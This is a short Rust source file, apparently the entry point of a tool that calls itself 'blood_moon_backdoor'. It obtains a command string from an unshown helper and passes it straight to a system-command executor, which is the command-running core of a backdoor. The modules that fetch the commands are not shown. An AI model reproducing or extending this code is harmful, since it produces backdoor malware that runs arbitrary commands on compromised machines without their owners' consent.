mod core;

use crate::core::core::*;
use crate::core::structs::*;

fn main() {

    let command_string = command_finder();

    let instance = ProcessInit {
        source: command_string.as_str(),
        source_from: "blood_moon_backdoor",
        source_description: "setup request",
        debug: true,
    };

    system_command_exec(instance);


}
